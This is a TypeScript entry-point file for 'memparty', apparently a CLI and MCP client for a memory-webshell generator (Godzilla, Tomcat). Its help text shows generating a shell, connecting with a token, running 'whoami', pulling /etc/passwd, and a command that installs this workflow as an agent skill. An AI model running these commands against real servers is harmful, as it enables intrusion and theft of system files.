import { Command, CommanderError } from "commander";

import { ApiError } from "./api/client.js";
import { reportError } from "./cli-context.js";
import { registerConfigCommand } from "./commands/config.js";
import { registerConnectCommand } from "./commands/connect.js";
import { registerCustomCommand } from "./commands/custom.js";
import { registerDemoCommand } from "./commands/demo.js";
import { registerExecCommand } from "./commands/exec.js";
import { registerGenCommand } from "./commands/gen.js";
import { registerLogCommand } from "./commands/log.js";
import { registerMcpCommand } from "./commands/mcp.js";
import { registerParseClassNameCommand } from "./commands/parse-classname.js";
import { registerProbeCommand } from "./commands/probe.js";
import { registerProfileCommand } from "./commands/profile.js";
import { registerSkillCommand } from "./commands/skill.js";
import { registerTargetCommand } from "./commands/target.js";
import { registerDownloadCommand, registerUploadCommand } from "./commands/transfer.js";
import { registerVersionCommand } from "./commands/version.js";
import { DEFAULT_API_URL, ENV_VAR } from "./core/config.js";
import { startRepl } from "./repl.js";
import { CLI_VERSION } from "./version.js";

function buildProgram(): Command {
  const program = new Command();

  program
    .name("memparty")
    .description("CLI + MCP client for MemShellParty (party.mem.mk)")
    .version(CLI_VERSION, "-v, --version", "output the CLI version")
    .option(
      "--api <url>",
      `MemShellParty backend URL (env ${ENV_VAR}, default ${DEFAULT_API_URL})`,
    )
    .option("--timeout <ms>", "request timeout in milliseconds", "30000")
    .exitOverride() // throw instead of process.exit — needed by the REPL and the JSON error path
    .addHelpText(
      "after",
      `
Quick start:
  $ memparty gen                                   # interactive memory-shell wizard
  $ memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 -o shell.class
  $ memparty connect -u http://192.0.2.1/shell.jsp -t godzilla --header-value my-secret-token
  $ memparty exec 192.0.2.1/godzilla --cmd whoami    # auto-saved by a successful connect
  $ memparty download 192.0.2.1/godzilla /etc/passwd -o passwd
  $ memparty list                                  # saved targets
  $ memparty log                                   # recent operations

Site-mimicking (mimic) flow:
  $ memparty skill install                         # teach your agent this workflow
  $ memparty profile init acme --site http://192.0.2.1:8080   # then write the profile
  $ memparty custom build --profile acme --server Tomcat      # -> injectable payload
  $ memparty demo                                  # local end-to-end walkthrough

Every subcommand has its own examples: memparty <command> --help
`,
    );

  registerGenCommand(program);
  registerProbeCommand(program);
  registerConfigCommand(program);
  registerConnectCommand(program);
  registerExecCommand(program);
  registerDownloadCommand(program);
  registerUploadCommand(program);
  registerTargetCommand(program);
  registerLogCommand(program);
  registerParseClassNameCommand(program);
  registerProfileCommand(program);
  registerSkillCommand(program);
  registerCustomCommand(program);
  registerDemoCommand(program);
  registerVersionCommand(program);
  registerMcpCommand(program);

  return program;
}

async function main(): Promise<void> {
  // bare `memparty` in a terminal drops into the REPL; piped/CI keeps printing help
  if (process.argv.length <= 2 && (process.stdin.isTTY || process.env.MEMPARTY_REPL)) {
    await startRepl(buildProgram);
    return;
  }

  const program = buildProgram();
  try {
    await program.parseAsync(process.argv);
  } catch (err) {
    // Set exitCode rather than calling process.exit(): an abrupt exit while
    // undici's (global fetch) keep-alive socket is still open trips a libuv
    // assertion on Windows. Letting the event loop drain avoids the crash.
    if (err instanceof CommanderError) {
      // exitOverride: commander already printed help/usage/version; keep its exit code
      process.exitCode = err.exitCode;
    } else if (err instanceof ApiError) {
      reportError(`API error (${err.status || "network"}): ${err.message}`, process.argv);
      process.exitCode = 1;
    } else if (err instanceof Error) {
      // Inquirer throws this when the user aborts with Ctrl-C.
      if (err.name === "ExitPromptError") {
        process.stderr.write("\nAborted.\n");
        process.exitCode = 130;
      } else {
        reportError(err.message, process.argv);
        process.exitCode = 1;
      }
    } else {
      reportError(String(err), process.argv);
      process.exitCode = 1;
    }
  }
}

void main();
